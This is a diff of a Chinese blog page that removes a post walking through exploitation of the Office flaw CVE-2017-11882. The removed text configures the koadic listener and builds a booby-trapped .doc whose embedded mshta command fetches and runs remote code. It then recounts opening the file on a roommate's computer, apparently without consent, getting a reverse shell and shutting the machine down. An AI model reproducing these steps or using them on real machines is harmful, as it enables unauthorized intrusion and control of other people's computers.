@@ -344,49 +344,17 @@
 
       
         
-          
-            <blockquote>
+          <blockquote>
 <p>2017年11月14日微软发布了潜伏17年之久的office远程代码执行漏洞（cve-2017-11882）。该漏洞为office内存破坏漏洞，影响目前流行的office版本。</p>
 </blockquote>
-<p>这两天群里有好一些人提起过这个漏洞，感觉挺屌的，恰好今天晚上有空，所以也来玩一下</p>
-<h4 id="通过koadic漏洞复现"><a href="#通过koadic漏洞复现" class="headerlink" title="通过koadic漏洞复现"></a>通过koadic漏洞复现</h4><p>下载地址<a href="https://github.com/backlion/koadic.git" target="_blank" rel="external">https://github.com/backlion/koadic.git</a></p>
-<p>切换到目录后输入<code>./koadic</code>执行</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171127-01.JPG" alt=""></p>
-<p>输入<code>help</code>看一下使用方法</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171127-02.JPG" alt=""></p>
-<p>设置一下ip地址和端口,和msf差不都</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">set lhost 192.168.1.115</div><div class="line">set lport 5555</div><div class="line">run</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171127-03.JPG" alt=""></p>
-<p>然后会生成一个网址，记下来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mshta http://192.168.1.115:5555/NtHMW</div></pre></td></tr></table></figure>
-<p>生成一个rtf/doc文档，github上有漏洞利用脚本</p>
-<p><a href="https://github.com/Ridter/CVE-2017-11882/" target="_blank" rel="external">https://github.com/Ridter/CVE-2017-11882/</a></p>
-<p>生成doc</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python Command109b_CVE-2017-11882.py -c &quot;mshta http://192.168.1.115:5555/NtHMW&quot; -o exploit.doc</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171127-04.JPG" alt=""></p>
-<p>嗯，把文件复制到U盘，打开室友电脑，然后打开文档。。。。，他电脑装了360，360一点反应都没有</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171127-05.JPG" alt=""></p>
-<p>成功反弹shell</p>
-<p>输入<code>zombies 0</code>切换到项目</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171127-06.JPG" alt=""></p>
-<p>cmdshell模块</p>
-<p>输入cmdshell 0</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171127-07.JPG" alt=""></p>
-<p>给他电脑关个机</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20171127-08.JPG" alt=""></p>
-<p>OK,漏洞利用到此结束</p>
-<blockquote>
-<p>漏洞影响版本：</p>
-<p>Office 365</p>
-<p>Microsoft Office 2000</p>
-<p>Microsoft Office 2003</p>
-<p>Microsoft Office 2007 Service Pack 3</p>
-<p>Microsoft Office 2010 Service Pack 2</p>
-<p>Microsoft Office 2013 Service Pack 1</p>
-<p>Microsoft Office 2016</p>
-</blockquote>
-
-          
+<p>这两天群里有好一些人提起过这个漏洞，感觉挺屌的，恰好今天晚上有空，所以也来玩一下<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/11/27/page171127/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
